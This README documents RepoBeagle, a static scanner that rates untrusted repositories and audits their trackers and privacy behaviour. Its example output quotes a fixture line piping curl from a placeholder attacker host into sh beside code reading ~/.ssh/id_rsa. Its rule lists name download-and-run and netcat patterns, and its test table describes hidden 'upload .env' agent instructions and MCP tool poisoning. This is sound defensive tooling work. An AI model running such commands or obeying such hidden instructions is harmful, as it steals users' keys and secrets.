# RepoBeagle

![RepoBeagle: Don't clone what you haven't sniffed.](assets/banner.png)

**Use it as a Grok Bot:** [Get the RepoBeagle bot](https://x.ai/bot/bTuuNK785OULBheQ5rPZ-) and paste any repo link to get a safety verdict.

*Sniffs out malicious repos before you trust them.* Run `repobeagle scan <url>`. Want it shorter? Add `alias beagle=repobeagle` to your shell; the installer does not create `beagle` because PackageBeagle already uses that name. The wrapper adds every Docker hardening flag for you (`--rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user $(id -u):$(id -g) --tmpfs /tmp`, target mounted `:ro`), so you never type docker flags.

A static safety check for untrusted repos, such as LLM-generated skills, plugins, MCP servers and "guides".
You give it a git URL or a local folder and get a **GREEN / YELLOW / RED** verdict, with `file:line` evidence for each finding.

**RepoBeagle never runs repo code.** It never runs installs or builds, and it never extracts archives.

## Install (DGX Spark / any Linux, arm64 or x86_64)
The scanners ship as a prebuilt **public** multi-arch image (no login needed), `ghcr.io/javierbits/repobeagle` (linux/amd64 + linux/arm64). It's built by `.github/workflows/image.yml` on every push to main, on `v*` release tags, weekly, and on manual dispatch. Release tags get `v1.40.0`-style and `stable` tags; main also gets `latest`, `sha-<commit>` and the ISO week (e.g. `2026-W42`). `install.sh` and `repobeagle` default to the image matching the `VERSION` file (currently `v1.40.0`).
```bash
git clone https://github.com/javierbits/repobeagle && cd repobeagle
./install.sh                   # docker pull ghcr.io/javierbits/repobeagle:v1.40.0 + install the repobeagle wrapper
./install.sh --build-local     # fallback: build the same image locally from the Dockerfile
./install.sh --local-tools     # also install gitleaks/semgrep/guarddog/bandit on the host for --no-docker
```
`install.sh` is idempotent. It does the following:
- Checks that Docker is available and pulls (or builds) the image.
- Installs `osv-scanner`, which runs on the host because it needs network. Arch is detected from `uname -m`: aarch64 gets `linux_arm64`, x86_64 gets `linux_amd64`.
- Writes a thin `~/.local/bin/repobeagle` wrapper.

If Docker isn't available, it installs the host tools automatically, and scans run with `--no-docker`.

How a scan is split up:
- **Clone (host, network-enabled):** a filtered, hooks-disabled git fetch that never executes anything.
- **Scan (container):** `docker run --rm --network none --read-only --cap-drop ALL`, non-root, with the clone mounted read-only.
- **OSV (host):** lockfiles only.

Set `BEAGLE_IMAGE` to use a different tag (e.g. `ghcr.io/javierbits/repobeagle:latest` for the newest main build).

## Usage
```bash
repobeagle scan <git-url | local-dir> [--strict|--balanced|--relaxed] [--keep] [--json out.json]
                [--no-docker] [--no-osv] [--verify-deps] [--all] [--no-color]
                [--privacy-only | --no-privacy] [--no-redact]
repobeagle privacy <git-url | local-dir> [same scan options]
```
Exit code: 0 = GREEN, 1 = YELLOW, 2 = RED. Colour turns off when output isn't a terminal or `NO_COLOR` is set.

`repobeagle privacy <target>` is the same as `scan --privacy-only`: a privacy audit that only reports privacy/telemetry findings. `--privacy-only` does it inline, `--no-privacy` drops those findings, `--no-redact` shows raw PII in snippets instead of the default masking.

| Profile | RED when | YELLOW when |
|---|---|---|
| strict | any high or critical | any low or above |
| balanced (default) | any critical | any medium or above |
| relaxed | any critical | any high |

To change the thresholds, edit `PROFILES` in `repobeagle.py`.

## Privacy: telemetry and trackers

A repo that is safe to run is not necessarily safe to *use*. The `telemetry` check reports who a repo phones home to, statically, from code, manifests and configs (no network, no repo code executed). Each finding is one vendor/endpoint with the first `file:line`, the number of hits and the rule id naming the kind:

| Rule id | What it means | Severity |
|---|---|---|
| `telemetry-session-replay` | records what you do (clicks, keystrokes, forms, page content): Clarity, Hotjar, FullStory, LogRocket, Smartlook, Mouseflow, Lucky Orange, Highlight, OpenReplay, Datadog RUM | high |
| `telemetry-ads` | advertising/attribution pixels with per-browser IDs: Meta, TikTok, LinkedIn, X/Twitter, Pinterest, Reddit | high |
| `telemetry-crash` | uploads stack traces and payloads, often file paths, env and request data: Sentry, Bugsnag, Rollbar, Raygun, Honeybadger, Airbrake, Exceptionless, Crashlytics, Application Insights, Backtrace | medium |
| `telemetry-analytics` | page views, events and persistent IDs: Google Tag Manager (`GTM-*`), Google Analytics/gtag, tracking pixels (`1x1`, `width=1 height=1`), Plausible, Umami, Matomo/Piwik, Fathom, GoatCounter, Simple Analytics, Cloudflare/Vercel Analytics, Segment, Mixpanel, Amplitude, PostHog, Heap, Countly, Adobe, Yandex Metrica, Baidu, WordPress Stats, Snowplow, RudderStack, Pendo, Optimizely, VWO, HubSpot, Klaviyo, Braze, OneSignal, Customer.io, Tealium, Mailchimp, Intercom, tracking pixels | medium/low |
| `telemetry-apm` | spans, logs or metrics are exported: **OpenTelemetry (OTEL/OTLP)**, Datadog APM (incl. `datadog*.yml`), New Relic, Elastic APM, Honeycomb, Dynatrace, Instana, AppSignal, Grafana Faro | medium/low |
| `telemetry-devtool` | build/CLI tools that report usage: Next.js, Nuxt, Astro, Gatsby, Turbo, Angular CLI, .NET CLI, Homebrew, HashiCorp checkpoint, Scarf | low |

OTEL is reported at medium: the SDK alone sends nothing, but once an exporter endpoint (OTLP, HTTP, gRPC) is configured, traces/logs can leave the machine. Each finding also says whether the repo mentions an opt-out (`DO_NOT_TRACK`, `NEXT_TELEMETRY_DISABLED`, `TELEMETRY_OPTOUT`, `DISABLE_TELEMETRY`, `--no-telemetry`, `telemetry: false`, `navigator.doNotTrack`, `CHECKPOINT_DISABLE`, …) or nothing at all. Config files count too (`sentry.properties`, `datadog*.yml`). Lockfiles are read for **transitive** telemetry: a vendor pinned only as a dependency gets one `low` finding marked `(transitive)`, and is suppressed when the repo itself references it. Prose (`.md/.mdx/.rst/.adoc`) is only used to detect opt-outs, because "an alternative to Sentry" is not a dependency.

Severity follows privacy impact, so a default `balanced` scan goes YELLOW when a repo has analytics/crash reporting; session replay or ad pixels make a `strict` scan RED.

### Other privacy signals

| Rule id | What it flags | Severity |
|---|---|---|
| `android-permission` | `AndroidManifest.xml` permissions (`uses-permission` and `uses-permission-sdk-23`) that read user data: precise/background location, camera, microphone, contacts, SMS, call log, storage, ad ID (`AD_ID`/`AD_ADSERVICES_AD_ID`), calendars, Bluetooth, all installed apps; Android 14 user-selected photo access is `info`, and permissions limited by `android:maxSdkVersion` are downgraded with a note. Benign ones (`INTERNET`, `VIBRATE`, …) are ignored | high/medium/low by data sensitivity |
| `android-feature` | `AndroidManifest.xml` `<uses-feature>` hardware declarations (`android.hardware.camera`, `microphone`, `location`, `bluetooth`, `nfc`, …) that imply the capability is used | info |
| `extension-permission` | browser-extension `manifest.json`: `<all_urls>`/`*://*/*`/wildcard-host access, `optional_host_permissions`, `content_scripts` on every page, plus sensitive APIs (`cookies`, `history`, `tabs`, `webRequest`, `bookmarks`, `downloads`, `clipboardRead`, `geolocation`, …) | high/medium/low |
| `extension-resource` | browser-extension `web_accessible_resources`: files exposed to `<all_urls>` (any site can load them and detect the extension) are `low`, site-scoped exposure `info` | low/info |
| `extension-connectable` | browser-extension `externally_connectable`: `<all_urls>` lets any website message the extension (`low`), listed sites only `info` | low/info |
| `insecure-endpoint` | `http://` requests to real remote hosts (plaintext), skipping local/LAN/CGNAT hosts and reference URLs in comments | medium |
| `cookie-write`, `cookie-flags` | `document.cookie =` writes, `Set-Cookie` headers and framework setters (`set_cookie(`, `res.cookie(`, `setcookie(`, `setCookie(`) missing `HttpOnly`/`Secure`/`SameSite`; JS cookies are checked for `Secure`/`SameSite` only (HttpOnly is server-only) | low |
| `browser-storage` | `localStorage`/`sessionStorage`/`indexedDB` writes: persistent client-side identifiers | info |
| `third-party-cdn` | assets loaded from third-party font/CDN hosts (they see your IP and the page URL) | low |
| `third-party-embed` | `<iframe>`/`<embed>`/`<object>`/`<video>` pointing at another host: it runs third-party code, sees your IP and can set its own cookies; `info` when sandboxed | low/info |
| `iframe-allow` | an embedded frame delegates `camera`, `microphone`, `geolocation`, clipboard, display-capture, USB/serial, … to the third party via `allow=` | medium |
| `third-party-form` | `<form action="https://other">`: user input is posted to a third party | low |
| `third-party-script` | `<script src="//other">`: executable third-party code with page privileges (info for known CDNs); own/related domains are skipped | low/info |
| `third-party-preconnect` | `<link rel="preconnect">`/`dns-prefetch` to another host: the browser opens a connection (IP, TLS) before any consent or request | low/info |
| `cookie-lifetime` | cookies with `Max-Age`/`Expires` over one year (`low`) or under it / session-scoped (`info`) | low/info |
| `consent-manager` | OneTrust/Optanon, Cookiebot, Osano, CookieYes, Klaro, tarteaucitron, Didomi, Usercentrics, Iubenda, … (positive signal: tracking should be gated on consent) | info |
| `external-endpoint` | inventory of remote hosts in code/config/HTML, including protocol-relative `//host/…`; known platforms/registries/CDNs are `info`, unknown third parties are `low` | info/low |
| `first-party-endpoint` | hosts belonging to the repo itself, inferred from `CNAME`, `package.json`, `pyproject.toml`, `setup.cfg`, `Cargo.toml`, `pubspec.yaml` or `composer.json`; classified as first-party and not counted against third-party checks | info |
| `macos-entitlement` | macOS `*.entitlements` capabilities granted without a per-use prompt: location, camera, microphone, photo library, contacts, calendars, Bluetooth, USB, network, file access, Apple Events automation | high/medium/low |
| `browser-capability` | web APIs that touch user data: clipboard read, geolocation, camera/microphone (`getUserMedia`, `enumerateDevices`), screen capture (`getDisplayMedia`, `MediaRecorder`), notifications, history (`pushState`), USB/serial/Bluetooth, cross-site storage access | medium/low |
| `client-id` | named persistent identifiers (`client_id`, `device_id`, `visitor_id`, `anonymous_id`, `distinct_id`, `installation_id`) stored in cookies/localStorage or generated as UUIDs | low |
| `fingerprint` | device fingerprinting: dedicated libraries (`fingerprintjs`, `botd`), canvas/WebGL/audio/font probing, screen geometry, UA/cores/memory/plugins, timezone/locale | high/medium/low |
| `import-time-network` | network calls at module scope (Python module body, JS top level) that run before you call anything | medium/low |
| `import-time-storage` | cookie/`localStorage` writes at JS module top level: they run on load, before user interaction or consent | low |
| `ip-logging` | request IP (`req.ip`, `remote_addr`, `X-Forwarded-For`, `HTTP_X_FORWARDED_FOR`, `True-Client-IP`, …) written to logs or storage; `info` when the same line/window masks, truncates or hashes it | low/info |
| `pii-log` | log/print statements naming personal data, and logged arguments whose name suggests a person (`console.log(user)`, `console.dir(user)`, `logger.info(account)`, `log::info!`, `println!`, `System.out.print`, `error_log`, `print_r`, …); `info` when the same line masks/redacts/hashes the value | low/info |
| `pii-email`, `pii-phone`, `pii-address`, `pii-ssn`, `pii-card` | hardcoded email addresses, E.164 phone numbers, `tel:`/`mailto:` links, postal addresses, US SSNs and payment card numbers (Luhn + issued IIN prefix) in source/config; example/test values and decimal fractions ignored, role mailboxes and `tel:`/`mailto:` links are `info`, emails/phones published in docs are `info` | low/info |
| `tracking-cookie` | known tracking cookie names (`_ga`, GA4 `_ga_<container>`, `_gac_*`, legacy `__utm*`, `_gid`, `_gcl_au`, `_fbp`, `_hj*`, `ajs_*`, `__hstc`, `intercom-*`, `mp_*`, `ph_*`, `_clck`, `_uetvid`, `_ttp`, `IDE`, `NID`, …) mapped to their vendor | low |
| `ios-tracking`, `ios-tracking-domain`, `ios-data-type` | Apple privacy manifest (`PrivacyInfo.xcprivacy`): `NSPrivacyTracking`, declared tracking domains, and every `NSPrivacyCollectedDataType` with linked/tracking flags and declared purposes (analytics, advertising, app functionality, …) | low/info |
| `ios-api-category` | Apple required-reason API categories declared in `PrivacyInfo.xcprivacy` (UserDefaults, FileTimestamp, SystemBootTime, DiskSpace, ActiveKeyboards, …) | info |
| `ios-purpose-string` | Apple purpose strings in `Info.plist` (`NSCameraUsageDescription`, `NSLocationWhenInUseUsageDescription`, …): the user-facing reason shown when the capability is requested | info |
| `dnt-respect` | repo has trackers and references (or never references) Do-Not-Track, Global Privacy Control / `Sec-GPC` or `DO_NOT_TRACK`; info when an opt-out is honoured, low when the signal is ignored | info/low |
| `consent-gating` | analytics/ads/session replay present but no consent manager (OneTrust, Cookiebot, Osano, CookieYes, Klaro, …) detected | low |
| `consent-order` | in an HTML/JS file a tracker initialises (`gtag(`, `fbq(`, `posthog.init`, `_paq`, …) before the consent manager loads | low |
| `consent-mode` | Google Consent Mode signals (`analytics_storage`, `ad_storage`, `ad_user_data`, …); `low` when Google Analytics runs with a CMP but no Consent Mode (EEA requirement) | info/low |
| `consent-state` | consent state stored client-side (`OptanonConsent`, `CookieConsent`, `cc_cookie`, `euconsent-v2`, `didomi_token`, …) | info |
| `tracking-params` | URLs carrying `utm_*`, `fbclid`, `gclid`, `msclkid`, `mc_eid`, `_gl`, `gclsrc`, … campaign/linker parameters; `low` in code/config, `info` for links in docs | low/info |
| `pii-in-url` | URLs with personal data in the query (`?email=`, `?phone=`, `?name=`, `?address=`, …): leaks via Referer, access logs, proxies and browser history; `low` in code, `info` for docs links | low/info |
| `data-retention` | retention/expiry windows in config/code (`retention_days`, `ttl`, `expires`, `delete_after`, …); `low` when the repo collects data but no retention setting exists | info/low |
| `upload-surface`, `upload-limit` | endpoints accepting files/request bodies, and size caps (`max_file_size`, `MAX_CONTENT_LENGTH`, `client_max_body_size`, `limits:`, …); `low` when uploads have no cap | info/low |
| `store-disclosure` | browser-extension data-collection declarations (Firefox `data_collection_permissions`); info when disclosures only exist on the store | info |
| `referrer-policy` | `Referrer-Policy` header, `<meta name="referrer">`, `referrerpolicy=` attributes, `fetch(..., {referrerPolicy})` or `rel="noreferrer"`; `low` when third-party requests exist without one (the full URL leaks in `Referer`) | info/low |
| `permissions-policy` | `Permissions-Policy` header; `low` when camera/microphone/geolocation/screen/clipboard APIs are used without one | info/low |
| `privacy-doc` | `info` when a privacy policy/manifest exists anywhere in the repo (`PRIVACY.md`, `docs/privacy-policy.md`, `PrivacyInfo.xcprivacy`, …) or the README links an external policy; `low` when data leaves the repo but no policy is shipped or linked | info/low |
| `undisclosed-vendor` | detected telemetry vendors that are not named in any README/privacy doc, when the repo ships one | info |

Findings from the `privacy`/`telemetry` checks have their snippets **and titles redacted by default** (emails `s***@domain`, cards `4111 **** **** 1111`, phones `+46 ***** 567`, SSNs `***-**-6789`) so a published badge report does not republish the PII it found. The report prints a redaction notice when it applies, `verify` prints `snippets: redacted by scanner` (or `raw`), `--no-redact` shows raw values and `meta.pii_redacted` records the mode.

Test fixtures and fake hosts (`example.com`, single-label names, private ranges) are excluded or downgraded so the checks don't drown a verdict in noise. `target/` build output is skipped like `dist/` and `build/`.

`repobeagle verify` prints the same counts line (`privacy: trackers N, pii N, …`) from the signed report, so a badge consumer sees the privacy profile without downloading the JSON. `badge.json` also carries a `privacy` object with those counts (extra keys are ignored by shields.io and available to any API consumer). Report and `--json` output add a structured `privacy_summary` grouping what was found by kind (trackers by telemetry kind and vendor, PII, permissions, fingerprinting, storage/cookies, consent, network, retention, uploads, transparency) so you can see *what kinds* a repo has without reading every finding. Suppressed findings are excluded from it and counted separately.

### Suppressing reviewed findings

If you reviewed a finding and accept it, add a `.repobeagleignore` at the repo root. One rule id or glob per line; `#` starts a comment:

```
# accepted: the installer is pinned by tag
Download-and-execute
telemetry-devtool
pii-*
```

Matching findings stay in `--json` with `"suppressed": true` and `meta.suppressed` counts them, but they are removed from the verdict and the printed report, and the AI review does not see them. This lets a repo silence known-benign noise without hiding it from anyone reading the JSON. Suppression is opt-in per repo and never changes what is scanned.

## Badge your repo

Run the scanner on every push and show the verdict in your README. Add this workflow (it installs repobeagle, scans your repo with the pinned image, publishes the badge and sets a `repobeagle/scan` commit status):

```yaml
# .github/workflows/repobeagle.yml
name: repobeagle
on:
  push:
    branches: [main]
    tags: ["v*"]
jobs:
  scan:
    permissions:
      contents: write   # publishes the repobeagle badge branch (optional)
      statuses: write   # sets the repobeagle/scan commit status (optional)
      id-token: write   # required: keyless-signs the report with Sigstore
    uses: javierbits/repobeagle/.github/workflows/scan.yml@main
    with:
      profile: balanced   # strict | balanced | relaxed
      fail-on-red: false  # true = the job fails on a RED verdict (PR gate)
      privacy-only: false # true = publish a privacy-audit verdict
```

Then add the badge; after a tag push, a per-tag badge also exists:

```markdown
![RepoBeagle](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/OWNER/REPO/repobeagle/badge.json)
![RepoBeagle v1.40.0](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/OWNER/REPO/repobeagle/badge-v1.40.0.json)
```

The workflow publishes a `repobeagle` branch containing `badge.json` (shields.io endpoint), a self-hosted `badge.svg` fallback and the full `report.json` (plus `report-<sha>.json` per commit and per-tag copies), so every finding is one click away from the badge. Inputs: `profile`, `fail-on-red`, `privacy-only`, `badge-branch` (empty string disables publishing), `set-status` (default true) and `tools-ref` (toolchain ref, default `main`; the `VERSION` file there pins the scanned image).

### Verifying a badge (public repos)

The badge is produced by the author's own CI, so on its own it is self-attested. The workflow therefore signs the report with Sigstore keyless signing and publishes the bundle as `report.sigstore.json` next to `report.json` on the badge branch. The signing certificate's identity is this repo's own reusable workflow (`javierbits/repobeagle/.github/workflows/scan.yml`), which callers cannot edit, so a valid signature means the official pipeline scanned that commit and the report was not swapped afterwards. To verify a badge: `verify` installs cosign to `~/.local/bin` on first use if it is missing (`./install.sh` also installs it).

```bash
repobeagle verify javierbits/javierbits.github.io
#   signature: VALID  policy: official scan.yml (main or v* tag)
#   report:    YELLOW  0 critical / 6 high / 1 medium / 56 low
#   scanned:   a7cb435002de at javierbits/javierbits.github.io (image ghcr.io/javierbits/repobeagle:v1.40.0)
#   freshness: UP TO DATE (HEAD a7cb435002de)
```

Exit codes: 0 = signature valid and report covers HEAD, 1 = invalid signature or missing report, 2 = valid but stale (report is older than HEAD). Local files work too: `repobeagle verify --report report.json --bundle report.sigstore.json`. What it runs under the hood:

```bash
cosign verify-blob \
  --bundle report.sigstore.json \
  --certificate-identity-regexp '^https://github\.com/javierbits/repobeagle/\.github/workflows/scan\.yml@refs/(heads/main|tags/v[0-9]+\.[0-9]+\.[0-9]+)$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  report.json
```

What this does and does not prove:
- Proven: the official workflow ran and produced exactly this report. The report records `meta.image_digest`, `meta.toolchain_ref`, the run URL, the scanned SHA and the scanned repository; a report produced for any other repository is rejected. The offline scan is deterministic, so anyone can re-run the pinned image on the same commit and diff the findings.
- Not proven: that the branch tip is still that commit. A repo owner can republish an old, honestly-green report next to new code; always check `meta.scanned_sha` against HEAD. A missing or failing signature means unverified, never verified. Badges also only make sense on public repos: on a private one nobody can see the README or the report. For a fully independent verdict, someone else must run the scan (or a future hosted service).

## Pipeline
1. **Fetch** always uses a filtered checkout, so huge repos stay small. It runs `git clone --depth 1 --filter=blob:none --no-checkout --no-recurse-submodules`, lists files with `git ls-tree`, then does a sparse checkout that **excludes archives and binaries**. Those files are reported as findings but never downloaded. For example, DataDog's ~44 GB malware dataset comes down as ~250 MB in about 17 s. The checkout goes into a fresh temp dir (mode 0700), with these protections: `GIT_TERMINAL_PROMPT=0`, `core.hooksPath=/dev/null`, `core.symlinks=false`, `protocol.file.allow=never`, `GIT_ALLOW_PROTOCOL=https:http:ssh`, no credential helper, and LFS smudge skipped. A local directory is copied instead, without `.git`. The copy is deleted at the end unless you pass `--keep`.
2. **Offline scanners** run in `docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user <you, non-root>` with the clone mounted **read-only** and no home directory or credentials mounted. If Docker or the image is missing, or you pass `--no-docker`, they run locally on the temp folder.
   - **gitleaks** `detect --no-git` (redacted). Hits in test/docs paths are downgraded.
   - **Semgrep** with `rules/custom.yml` (decode-and-exec, download-and-run, child_process curl, dangerous C string functions, weak Go crypto, SQL string concatenation, Dockerfile last-USER-root).
   - **GuardDog** source scan of the local package (pypi and/or npm if the repo root has a manifest). `capability-*` rules count as low and `threat-*` rules as high.
   - **Bandit** static analysis of Python sources (shell=True subprocess, yaml.load, asserts in shipped code, hardcoded passwords). Hits in test/docs paths are downgraded.
   - **Agent checks** (pure Python, stdlib):
     - Invisible and bidi Unicode (zero-width, U+202A–202E, U+2066–2069, tag chars U+E0000–E007F). Hidden tag text is decoded and shown.
     - Prompt injection in README, SKILL.md, AGENTS.md, CLAUDE.md, .cursor rules, *.mdc and prompt files, including inside HTML comments.
     - Hidden markdown in every .md/.mdx: HTML comments, `<details>` blocks, image alt/title text, CSS-hidden text and whitespace-padded lines carrying agent or exfil wording.
     - **MCP tool poisoning**: `<IMPORTANT>` blocks, concealment wording and secret reads inside MCP tool descriptions or docstrings.
     - Reading ~/.ssh, .env, cloud creds, browser cookies or wallets near a network sink.
     - MCP/plugin manifests that grant a shell, `/` or home filesystem access, `*` or `Bash(*)` permissions, `dangerously*` flags, remote servers or `npx -y`.
     - Install hooks: npm pre/post/install, setup.py cmdclass and os.system, pyproject build hooks, devcontainer commands, VS Code folderOpen tasks, git hooks, Makefile.
     - Download-and-execute patterns: `curl|sh`, `wget|bash`, `base64 -d|sh`, eval/exec of decoded blobs, large base64 blobs.
     - Prebuilt binaries, and archives. Archives are **never extracted**: zip headers are read to spot password-protected or encrypted samples, which are flagged as uninspectable.
     - Build-time code beyond npm: setup.cfg/build.py/hatch_build.py fetch or subprocess, `build.rs`, `//go:generate` with curl/sh, node-gyp actions, unknown pyproject `build-backend`, curl/base64/nc in Makefile/justfile.
     - GitHub Actions: pwn-request (`pull_request_target`/`workflow_run` + PR head checkout), other privileged triggers, secrets echoed, `curl|sh`, write permissions, actions not pinned to a commit SHA.
     - Executables disguised by extension (magic-byte mismatch, e.g. an ELF named `.png`), high-entropy blobs (Shannon > 5.2), minified JS outside build/dist paths.
     - Typosquatted dependencies (npm, PyPI, crates) one edit away from popular packages.
     - **Telemetry/privacy**: known analytics, session-replay, ad-pixel, crash-reporting, APM and OTEL vendors (endpoints and SDK imports) with the kind in the rule name (`telemetry-analytics`, `telemetry-session-replay`, `telemetry-ads`, `telemetry-crash`, `telemetry-apm`, `telemetry-devtool`). Lockfiles yield one low `(transitive)` finding per vendor pinned only as a dependency; one finding per direct vendor with the first `file:line` and hit count, plus whether the repo mentions an opt-out (`DO_NOT_TRACK`, `NEXT_TELEMETRY_DISABLED`, `telemetry: false`, …).
3. **OSV-Scanner** runs **on the host, outside the sandbox**, because the vulnerability DB is online. It only reads lockfiles and manifests from the clone and sends package names and versions to osv.dev. `--no-osv` skips it. (Offline mode `--offline-vulnerabilities --download-offline-databases` is a possible later improvement.) It also catches `MAL-` malicious-package advisories.
4. **Trust signals** (host, unauthenticated public GitHub API, `--no-trust` skips): repo younger than 30 days, owner younger than 90 days, ≥500 stars in <60 days, ≥200 stars with one contributor, renamed/transferred repos. LOW/INFO only, so they never make a repo RED on their own; offline or rate-limited runs just note it.
5. **`--verify-deps`** (optional, host, network): GuardDog downloads each dependency from requirements.txt or package.json and statically scans it. Nothing is installed.
6. **AI review** (optional): set `BEAGLE_LLM_URL` (legacy `REPO_GUARD_LLM_URL` also accepted) to an OpenAI-compatible endpoint, for example `http://spark1:8000/v1`. Optional extras are `BEAGLE_LLM_MODEL`, `BEAGLE_LLM_KEY` and `BEAGLE_LLM_TIMEOUT`.
   - It sends key files (invisible characters rendered as `<U+XXXX>`) plus the top findings, and asks for an intent judgment.
   - The model can only **raise** the verdict: malicious with confidence ≥0.6 makes it RED, and suspicious turns GREEN into YELLOW.
   - If the variable is unset, this step is skipped cleanly.

Apart from the clone, OSV/GuardDog-verify, the GitHub trust lookup and your own LLM endpoint, it makes no other network calls.

## Example output (abridged)
```
repobeagle 1.40.0  |  tests/fixtures/trap-npm
  VERDICT: RED    2 critical / 2 high findings, e.g. npm lifecycle script 'postinstall' runs automatically on install (package.json:8)
  CRITICAL [agent-checks] package.json:8
           npm lifecycle script 'postinstall' runs automatically on install
           > "postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js"
  CRITICAL [agent-checks] scripts/setup.js:5
           Code reads secrets/credentials near a network call
           > const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
Recommended actions:
  - Do NOT install, build, run, or point an AI agent at this repo. ...
```

## Tests
Run `tests/run_tests.sh`, or `tests/run_tests.sh --offline` for the fixtures only.

| Target | Expect |
|---|---|
| tests/fixtures/trap-npm (postinstall `curl\|sh`, reads ~/.ssh/id_rsa and POSTs it) | RED |
| tests/fixtures/trap-skill (SKILL.md with zero-width and tag-char hidden "upload .env" instruction, over-broad mcp.json) | RED |
| tests/fixtures/trap-gha, trap-markdown, trap-build, trap-binary, trap-telemetry, trap-privacy (one trap per check family; each rule name must fire) | YELLOW/RED |
| tests/fixtures/control-clean (pinned actions, minified bundle in `public/`, normal README with comment/details/alt text, real deps), `--strict` | GREEN |
| tests/fixtures/ignore-suppressed (`.repobeagleignore` silences a `curl\|sh`, finding stays in JSON as suppressed) | GREEN |
| tests/test_trust.py (offline trust-signal unit tests) | pass |
| psf/requests, tj/commander.js | GREEN/YELLOW |
| invariantlabs-ai/mcp-injection-experiments | RED (MCP tool poisoning / exfil instructions) |
| juice-shop/juice-shop | YELLOW (control: intentionally vulnerable code, not malicious) |
| DataDog/malicious-software-packages-dataset | YELLOW: about 29.7k malware-sample zips are listed via ls-tree and flagged as uninspectable. They are never downloaded or extracted. |

## What it catches, and what it doesn't
**Catches**: obvious install-time payloads, credential theft patterns, hidden or invisible agent instructions, MCP tool poisoning, over-privileged agent configs, committed secrets, known-vulnerable or known-malicious dependencies, obfuscated loaders, dangerous C APIs, and weak Go crypto or injectable SQL built by concatenation. Also flags **telemetry and trackers** (analytics, session replay, ad pixels, crash reporting, APM/OTEL, dev-tool and transitive dependency telemetry) and **privacy signals** (device fingerprinting, Android/browser-extension/macOS permissions, plaintext endpoints, cookie flags, IP logging, PII in logs/source, tracking parameters, consent managers, Do-Not-Track handling, iOS/macOS privacy manifests, missing privacy policy) so you know what a repo reports, to whom, and whether it documents an opt-out.

**Misses**:
- Well-obfuscated or novel logic, and payloads fetched at runtime from innocent-looking URLs.
- Malicious code inside binaries or archives (flagged, not inspected), and anything in git history older than the shallow clone.
- Submodules, which are not fetched.
- Clever natural-language injection that avoids the keywords (the optional AI review helps here).

Static analysis can't prove a repo is safe.

**False positives**: security tools and test suites can trigger credential and secret rules. Test and docs paths are downgraded, but YELLOW on big honest repos is normal. Specific context is now taken into account: comments that only mention a sensitive path are ignored; reading the repo's own `.env` is low (medium only next to a network call) while `.ssh`, wallets, cookies and cloud creds stay high/critical; `.github/` issue/PR template comments are info; module-scope network detection skips `import`/`from`/`export` lines; `.env` in a comment no longer triggers the credential rule.
